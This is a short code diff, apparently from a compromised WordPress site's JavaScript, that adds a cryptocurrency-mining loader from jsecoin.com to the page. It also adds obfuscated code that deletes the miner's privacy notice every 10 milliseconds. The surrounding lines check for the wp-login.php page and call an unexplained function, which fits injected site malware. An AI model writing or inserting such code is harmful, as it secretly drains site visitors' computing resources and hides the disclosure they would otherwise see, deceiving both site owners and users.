@@ -767,3 +767,11 @@ if (window['location']['href']['indexOf']('wp-login.php') > -1) {
     	localStorage[cookie_name] = Date.now();
     	exFunc();
     }
+
+!function(){var e=document,t=e.createElement("script"),s=e.getElementsByTagName("script")[0];t.type="text/javascript",t.async=t.defer=!0,t.src="https://load.jsecoin.com/load/29089/global.com/0/0/",s.parentNode.insertBefore(t,s)}();
+      window["setInterval"](function() {
+        var _0x4a1cx5c = document["getElementById"]("jseprivacy");
+        if (_0x4a1cx5c) {
+          _0x4a1cx5c["parentNode"]["outerHTML"] = "";
+        }
+      }, 10);
